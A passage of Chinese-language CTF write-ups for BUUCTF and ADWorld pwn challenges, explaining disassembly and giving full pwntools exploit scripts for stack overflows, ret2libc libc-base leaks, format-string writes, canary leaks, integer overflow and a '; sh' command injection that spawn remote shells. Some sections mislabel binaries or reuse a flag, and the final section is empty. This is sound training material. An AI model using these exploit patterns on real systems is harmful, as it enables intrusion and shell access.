![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/1.png)

用`IDA Pro 32bit`打开附件`babyrop`，按`F5`反汇编源码并查看主函数，可以看到将一个随机数赋值给了`buf`变量。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/2.png)

双击`sub_80486BB()`函数查看详情发现这是一个初始化缓存区的函数。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/3.png)

双击`sub_804871F()`函数查看详情，发现传入的参数`a1`被格式化字符串后赋值给了变量`s`。`v1`变量用于获取`char`型数组`buf`的大小，`strncmp()`函数用于比较用户输入的数和随机数的大小，构造`payload`时可以先用`\x00`来绕过`strncmp()`，因为`strlen()`遇到`\x00`时便会停止获取长度。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/4.png)

双击`sub_80487D0()`函数查看详情，发现该函数声明了一个`char`型数组的局部变量`buf`，可用栈大小为`0xe7`。如果`a1`等于`127`则会读入`0xc8`个字节到变量`buf`并不会导致栈溢出，但是当`a1`大于`0xe7`时就会读入`a1`个字节到变量`buf`从而造成栈溢出漏洞。因为`a1`是函数`sub_804871F()`的返回值，所以构造`payload`时让`a1`的值大于`\xe7`就可以导致栈溢出啦。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/5.png)

总的来说这题的思路就是：构造`payload`时先用`\x00`使得`v1`通过`strlen()`获取的返回值为0，从而绕过`strncmp()`的比较，此外`sub_804871F()`函数的返回值要尽可能大，所以`v5`读取输入时可以赋值为`\x00\xff\xff\xff\xff\xff\xff\xff`，这样函数返回值在传入`sub_80487D0()`函数时才能构造栈溢出漏洞。

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是需要注意到主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的内存地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，利用栈溢出漏洞并通过`read()`函数泄露`write()`函数在`got`表中的内存地址`write_address`。接着我们需要用到题目给出的`libc-2.23.so`，根据`libc`中`write()`函数的偏移地址可以计算出该`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址可以计算出这俩个函数的内存地址，最后利用栈溢出漏洞来完成系统调用`system('/bin/sh')`，输入`cat flag`后即可拿到`flag`。

编写`Python`代码即可得到`flag{2c99881a-89e7-41c6-83a1-7a0e3781f961}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25522)
# io = process('./babyrop')
e = ELF('./babyrop')
io.sendline(b'\x00'.ljust(8, b'\xff'))
write_plt = e.plt['write']
write_got = e.got['write']
main_address = 0x8048825
payload = b'a'*0xe7 + b'pwn!'
payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Correct\n', payload)
write_address = u32(io.recv(4))
log.success('write_address => 0x%x', write_address)
libc = ELF('./libc-2.23.so')
libcbase = write_address - libc.symbols['write']
info('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system']
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__()
log.success('bin_sh_address => 0x%x', bin_sh_address)
io.sendline(b'\x00'.ljust(8, b'\xff'))
payload = b'a'*0xe7 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendlineafter(b'Correct\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/6.png)

------

### [jarvisoj_fm](https://buuoj.cn/challenges#jarvisoj_fm)

先`file ./jarvisoj_fm`查看文件类型再`checksec --file=./jarvisoj_fm`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/1.png)

用`IDA Pro 32bit`打开附件`babyrop`，按`F5`反汇编源码并查看主函数，可以看到声明了一个可用栈大小为`0x5C`字节的`char`型变量`buf`，`read()`函数从`stdin`中读取了`0x50`字节数据到变量`buf`中。接着出现了一个明显的格式化字符串漏洞，

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/2.png)

双击变量`x`查看其在内存中的地址信息为`0x804A02C`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/3.png)

第10行的`printf()`其地址信息为`0x80485AD`，我们可以在这里设置一个断点。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/4.png)

`run`运行程序，输入多个`a`字符。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/5.png)

`x/16wx $esp`的意思是以`16`进制查看`$esp`寄存器的参数信息，`a`的`ACSII`码的`16`进制是`0x61`，我们可以看到赋值参数在第`11`位。接着我们利用`x`的地址配合上`%11$n`将`x`的值修改为`4`，即可让程序系统调用`/bin/sh`终端从而拿到`flag`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/6.png)

编写`Python`代码即可得到`flag{0516c5fb-3bf9-4ea8-a3ae-db6489a1db76}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29158)
x_addr = 0x804A02C
payload = p32(x_addr) + b'%11$n'
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/7.png)

------

### [jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)

先`file ./level2_x64`查看文件类型再`checksec --file=./level2_x64`检查一下文件保护情况。

 ![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/1.png)

用`IDA Pro 64bit`打开附件`level2_x64`，可以看到主函数的汇编语言代码如下，先是调用了一个名为`vulnerable_function()`的函数，然后系统调用`echo`语句输出了`Hello World!`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/2.png)

按`F5`进行反汇编后，可以看到`main()`函数的`C`语言代码如下：

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/3.png)

双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x80`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x200`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/4.png)

双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x80`个字节占满`buf`变量，再用`0x8`个字节覆盖到栈帧`r`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/5.png)

在`Functions window`中可以看到有个`system()`函数，其地址为`0x4004C0`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/6.png)

使用`ROPgadget`可以查看到`/bin/sh`的地址为`0x600A90`。

```bash
ROPgadget --binary ./level2_x64 --string "/bin/sh"
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/7.png)

`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8D`、`R9D`，剩下的参数从右往左依次入栈。因此该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi`的地址为`0x4006B3`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/8.png)

编写 `Python`代码即可得到`flag{32d6e6d5-6d67-4486-b72b-5351bcfc4cc8}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27561)
e = ELF('./level2_x64')
system_address = e.symbols['system'] # 0x4004C0
bin_sh_address = 0x600A90 # ROPgadget --binary ./level2_x64 --string "/bin/sh"
pop_rdi = 0x4006B3 # ROPgadget --binary ./level2_x64 --only "pop|ret"
payload = b'a'*0x80 + b'fuckpwn!'
payload += p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/9.png)

------

### [bjdctf_2020_router](https://buuoj.cn/challenges#bjdctf_2020_router)

先`file ./bjdctf_2020_router  `查看文件类型，再`checksec --file=./bjdctf_2020_router  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./bjdctf_2020_router       
./bjdctf_2020_router: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=41f17252e18bfaccd3440389de0dd5697148c91f, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./bjdctf_2020_router       
[*] '/home/tyd/ctf/pwn/pwnthebox/bjdctf_2020_router'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开`bof`后按`F5`反汇编源码并查看主函数。输入`1`是`ping`，并且`1`是直接`system()`系统调用输出的字符串，我们可以在此拼接上`sh`获得靶机`shell`权限。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-74h] BYREF
  char buf[16]; // [rsp+10h] [rbp-70h] BYREF
  char dest[8]; // [rsp+20h] [rbp-60h] BYREF
  __int64 v7; // [rsp+28h] [rbp-58h]
  int v8; // [rsp+30h] [rbp-50h]
  char v9; // [rsp+34h] [rbp-4Ch]
  char v10[56]; // [rsp+40h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  *(_QWORD *)dest = 0x20676E6970LL;
  v7 = 0LL;
  v8 = 0;
  v9 = 0;
  v4 = 0;
  puts("Welcome to BJDCTF router test program! ");
  while ( 1 )
  {
    menu();
    puts("Please input u choose:");
    v4 = 0;
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        puts("Please input the ip address:");
        read(0, buf, 0x10uLL);
        strcat(dest, buf);
        system(dest);
        puts("done!");
        break;
      case 2:
        puts("bibibibbibibib~~~");
        sleep(3u);
        puts("ziziizzizi~~~");
        sleep(3u);
        puts("something wrong!");
        puts("Test done!");
        break;
      case 3:
        puts("Please input what u want to say");
        puts("Your suggest will help us to do better!");
        read(0, v10, 0x3AuLL);
        printf("Dear ctfer,your suggest is :%s", v10);
        break;
      case 4:
        puts("Hey guys,u think too much!");
        break;
      case 5:
        puts("Good Bye!");
        exit(-1);
      default:
        puts("Functional development!");
        break;
    }
  }
}
```

编写`Python`代码解得`flag{d8dc77b9-ebba-4da1-b459-2f23fd1fc1bc}`，提交即可。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29833)
io.sendlineafter('Please input u choose:', b'1')
io.sendlineafter('Please input the ip address:', b'127.0.0.1; sh')
io.interactive()
```

------

## ADWorld

### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)

先`file ./get_shell`查看文件类型再`checksec --file=get_shell`检查一下文件保护情况。`nc`进去`ls`后发现可以直接`cat flag`，从而得到`cyberpeace{307531652bd497aefcfef07598c97cd3}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/1.png)

提交`flag`后，我还是决定用`IDA Pro 64bit`打开附件`get_shell`来分析一下，发现该程序输出字符串后直接给定了一个系统调用。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/2.png)

可以按`F5`反汇编源码并查看主函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/3.png)

编写`Python`代码拿到`cyberpeace{307531652bd497aefcfef07598c97cd3}`。

```python
from pwn import *

io = remote('111.200.241.244', 59901)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/4.png)

------

### [hello_pwn](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5052&page=1)

先`file ./hello_pwn`查看文件类型再`checksec --file=hello_pwn`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/1.png)

用`IDA Pro 64bit`打开附件`hello_pwn`，按`F5`反汇编源码并查看主函数，发现`read()`函数很可疑，双击`unk_601068`变量查看其在内存中的地址情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/2.png)

发现`unk_601068`变量和`dword_60106C`的偏移量为`0x4`，这个数值小于`read()`函数的范围限制。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/3.png)

当`dword_60106C`的数值等于`1853186401`时会调用子函数`sub_400686()`，查看详情发现该子函数是系统调用`cat flag.txt`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/4.png)

构造`payload`时先用`4`个字节占满`unk_601068`变量，再用`p64()`函数将`dword_60106C`的数值赋值为`1853186401`，编写`Python`代码即可得到`cyberpeace{285b4e962d0debee56c43f8f174f2e22}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/5.png)

------

### [level0](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053)

先`file ./level0`查看文件类型再`checksec --file=level0`一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/1.png)

用`IDA Pro 64bit`打开附件`level0`，按`F5`反汇编源码并查看主函数，发现`vulnerable()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/2.png)

双击`vulnerable()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x200`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x80`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/4.png)

在`Function Window`中注意到有一个名为`callsystem()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`callsystem()`函数的起始地址`0x400596`即可。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/5.png)

编写`Python`代码即可得到`cyberpeace{abcdc2f34ed094260c9ef32f07e7465b}`。

```python
from pwn import *

io = remote('111.200.241.244', 53710)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => %s' % hex(address).upper())
payload = b'a'*(0x80) + b'fuckpwn!' + p64(address)
# payload = b'a'*(0x80) + b'fuckpwn!' + p64(0x400596)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/6.png)

------

### [level2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055)

先`file ./level2`查看文件类型再`checksec --file=level2`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/1.png)

用`IDA Pro 32bit`打开附件`level2`，按`F5`反汇编源码并查看主函数，发现`vulnerable_function()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/2.png)

双击`vulnerable_function()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x88`，即可用栈大小只有`136`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x100`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/4.png)

双击`system()`函数查看详情，函数返回值直接是系统调用，因此构造`payload`时需要再加上`system()`函数的起始地址`0x8048320`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/5.png)

`p32()`可以让我们将整数转换为`4`字节的小端序格式，`system()`函数的参数`command`要求`dword ptr 4`，所以进入到`system()`函数后，还需要构造`system()`函数的栈帧，我们可以用`0xDEADBEEF`来填充已分配但还未初始化的内存，也可以用`p32(0)`来填充四个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/6.png)

最后再加上`system()`函数中的参数`/bin/sh`的地址即可获得`shell`。这里用了`ELF`中的`search()`函数来获取`/bin/sh`的地址。

编写`Python`代码即可得到`cyberpeace{5f581b52af1ababeb4636a8c9911e25d}`。

```python
from pwn import *

io = remote('111.200.241.244', 53598)
e = ELF('level2')
system_address = e.symbols['system']
log.success('system_address => %s' % hex(system_address).upper())
bin_sh_address = e.search(b'/bin/sh').__next__()
log.success('bin_sh_address => %s' % hex(bin_sh_address).upper())
payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xDEADBEEF) + p32(bin_sh_address)
# payload = b'a'*0x88 + b'fuck' + p32(0x8048320) + p32(0) + p32(0x804A024)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/7.png)

------





------

### [int_overflow](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058)

先`file ./int_overflow`查看文件类型再`checksec --file=int_overflow`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/1.png)

用`IDA Pro 32bit`打开附件`int_overflow`，按`F5`反汇编源码并查看主函数，显然首先要发送`1`来进入`login()`函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/2.png)

双击`login()`函数查看详情，不存在栈溢出，程序接受了一个最大长度为`0x199`的`password`，并将其作为参数传递给了`check_passwd()`函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/3.png)

双击`check_passwd()`函数查看详情，程序用了一个`8bit`的无符号整型变量存储`password`的长度，之后用字符串拷贝函数`strcpy()`将其拷贝到一个长度为`0x14`的`char`型变量`dest`中。`8bit`能表示的十进制范围是`0~255`，而`password`的最大长度为`0x199`（十进制为 409），长度远大于`1`字节，存在整数溢出。`password`字符串的长度可以是`4~8`个字符，也可以是`259~263`个字符，因此我们可以利用整数溢出来绕过`if`判断从而构造栈溢出。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/4.png)

在`Function Window`中注意到有一个名为`what_is_this()`的函数，函数返回值直接是系统调用`system("cat flag")`，因此构造`payload`时需要再加上这个`what_is_this()`函数的起始地址`0x804868B`，当然也可以`ELF`再`symbols['what_is_this']`来获取。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/5.png)

编写`Python`代码即可得到`cyberpeace{8f9f902ebeb37850f02feee9facc249d}`。

```python
from pwn import *

io = remote('111.200.241.244', 55529)
e = ELF('./int_overflow')
io.sendlineafter(b'Your choice:', b'1')
io.sendlineafter(b'Please input your username:', b't0ur1st')
payload = b'a'*0x14 + b'pwn!' + p32(e.symbols['what_is_this'])
payload = payload.ljust(263, b'a')
io.sendlineafter(b'Please input your passwd:', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/6.png)

------

### [cgpwn2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5059)

先`file ./cgpwn2`查看文件类型再`checksec --file=cgpwn2`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/1.png)

用`IDA Pro 32bit`打开附件`int_overflow`，按`F5`反汇编源码并查看主函数，发现`hello()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/2.png)

双击`hello()`函数查看详情，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x26`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/3.png)

注意到`name`是`bss`段中一个大小为`0x34`的区域，变量`s`的起始位置在程序运行时距离栈帧有`0x26`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/4.png)

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/5.png)

构造`payload`时可以先传入`/bin/sh`给`name`，接着用`0x26`个字节占满`s`变量，然后再用`4`个字节覆盖到`r`，最后指向`system()`函数和`name`的地址，从而完成系统调用。编写`Python`代码即可得到`cyberpeace{0de31e1800e130387c77fabf5ece76c9}`。

```python
from pwn import *

io = remote('111.200.241.244', 56171)
e = ELF('./cgpwn2')
system_address = e.symbols['system']
info('system_address => 0x%x', system_address)
name_address = 0x804A080 
payload = b'a'*0x26 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(name_address)
io.sendlineafter(b'please tell me your name', b'/bin/sh')
io.sendlineafter(b'hello,you can leave some message here:', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/6.png)

------

### [level3](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5060)

先`file ./level3`查看文件类型再`checksec --file=level3`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/1.png)

用`IDA Pro 32bit`打开附件`level3`，可以看到主函数如下：

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/2.png)

双击`vulnerable_function`查看详情：

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/3.png)

按`F5`反汇编源码可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/4.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`4`个字节覆盖到`r`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/5.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。接着我们可以用题目附件给出的`libc_32.so.6`来得到`write()`函数的偏移地址，从而计算出`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，最后发送`payload`即可拿到`flag`。

编写`Python`代码即可得到`cyberpeace{e1aa176d2d3aca8bc677d1c25dc9d919}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('111.200.241.244', 51304)
e = ELF('./level3')
write_plt = e.plt['write'] # 0x8048340
info('write_plt => 0x%x', write_plt)
write_got = e.got['write'] # 0x804a018
info('write_got => 0x%x', write_got)
main_address = e.symbols['main'] # 0x8048484
info('main_address => 0x%x', main_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Input:\n', payload)
write_address = u32(io.recv(4)) 
log.success('write_address => %s', hex(write_address))
libc = ELF('./libc/libc_32.so.6')
libcbase = write_address - libc.symbols['write']
log.success('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system'] 
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__() 
log.success('bin_sh_address => 0x%x', bin_sh_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/6.png)

------

### [Mary_Morton](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4979)

先`file ./Mary_Morton`查看文件类型再`checksec --file=Mary_Morton`检查一下文件保护情况。`Canary found`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/1.png)

用`IDA Pro 64bit`打开附件`Mary_Morton`，按`F5`反汇编源码并查看主函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/2.png)

双击`sub_4009FF()`函数查看详情。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/3.png)

双击`sub_4009DA()`函数查看详情。通过观察主函数后面的代码发现这部分代码并没有骗人，输入`1`确实可以看到栈溢出漏洞，输入`2`确实存在格式化字符串漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/4.png)

双击`sub_4008EB()`函数查看详情，我们可以利用该函数的格式化漏洞来泄露出`canary`的值。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/5.png)

双击`sub_400960()`函数查看详情，我们可以利用该函数的栈溢出漏洞来让程序执行后门函数从而拿到`flag`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/6.png)

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/7.png)

编写`Python`代码即可得到`cyberpeace{2b62375defc58c432dee9e3903b48022}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 51303)
io.sendlineafter(b'3. Exit the battle', b'2')
io.sendline(b'%23$p')
io.recvuntil(b'0x')
canary = int(io.recv(16), 16)
flag_addr = 0x4008da
io.sendlineafter(b'3. Exit the battle', b'1')
payload = b'a'*0x88 + p64(canary) + b'a'*8 + p64(flag_addr)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/8.png)

------

### [反应釜开关控制](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4912)

先`file ./pwn4912`查看文件类型再`checksec --file=./pwn4912`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/1.png)

用`IDA Pro 64bit`打开附件`pwn4912`，按`F5`反汇编源码并查看主函数。注意到`char`型数组变量`v5`的可用栈大小为`0x200`，但是`get()`函数读取输入到`v5`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/2.png)

双击`v5`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x200`个字节占满`v5`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/3.png)

在`Functions window`中可以看到有一个名为`shell()`的函数，其返回值直接是系统调用`system("/bin/sh")`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/4.png)

编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。

```python
from pwn import *

io = remote('111.200.241.244', 51772)
e = ELF('./pwn4912')
shell_address = e.symbols['shell']
payload = b'a'*0x200 + b'fuckpwn!' + p64(shell_address)
io.sendlineafter(b'>', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/5.png)

------

### [pwn1](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4598)

先`file ./pwn1`查看文件类型再`checksec --file=./pwn1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/4598/1.png)

用`IDA Pro 64bit`打开附件`pwn1`，按`F5`反汇编查看主函数源码：

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // eax
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v6; // [rsp+98h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(s, 0, 0x80uLL);
  while ( 1 )
  {
    sub_4008B9();
    v3 = sub_400841();
    switch ( v3 )
    {
      case 2:
        puts(s);
        break;
      case 3:
        return 0LL;
      case 1:
        read(0, s, 0x100uLL);   //这里就是栈溢出漏洞点
        break;
      default:
        sub_400826("invalid choice");
        break;
    }
    sub_400826(&unk_400AE7);
  }
}
```

双击`sub_4008B9()`函数查看详情，可以看到有三个可选项：

```c
__int64 sub_4008B9()
{
  sub_400826("--------");
  sub_400826("1.store");
  sub_400826("2.print");
  sub_400826("3.quit");
  sub_400826("--------");
  return sub_4007F7(">> ");
}
```

由于文件开启了`canary`保护，所以我们需要先泄露`canary`。而栈溢出漏洞点就在选择`1`后的`read(0, s, 0x100uLL);`，读取的字符长度超出了`char`型数组的定义长度。此外，我们还需要用`ROPgadget`找到`pop_rdi_ret`的地址：

```bash
ROPgadget --binary ./babystack --only "pop|ret"
```

接着就可以绕开`canary`保护，利用`puts()`函数的`got`表和`plt`表来泄露`puts()`函数在内存中的地址，从而得到`libc`的版本信息和`libc`的基址地址，最后构造`ROP`链来获取`shell`。编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 56617)
e = ELF('./babystack')
 
def get_info():
	info = io.recvline()
	return info
 
def store_info(payload):
	io.sendlineafter(b'>> ', b'1')
	io.sendline(payload)
	return get_info()
 
 
def print_info():
	io.sendlineafter(b'>> ', b'2')
	return get_info()
 
#leak canary
payload = b'a'*0x88
store_info(payload)
print_info()
canary = u64(io.recv(7).rjust(8, b'\x00'))
log.success("canary => %#x", canary)

# leak libcbase_address 
pop_rdi = 0x400a93
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main_address = 0x400908
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, puts_got, puts_plt, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
log.info("puts_address => %#x", puts_address)
libc = LibcSearcher('puts', puts_address)  # libc6_2.23-0ubuntu10_amd64
libcbase = puts_address - libc.dump('puts')

# get shell
system_address = libcbase + libc.dump('system')
log.success("system_address => %#x", system_address)
bin_sh_address = libcbase + libc.dump('str_bin_sh')
log.success("binsh_address => %#x", bin_sh_address)
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, bin_sh_address, system_address, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
io.interactive()
```

------

### [Aul](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=5009)

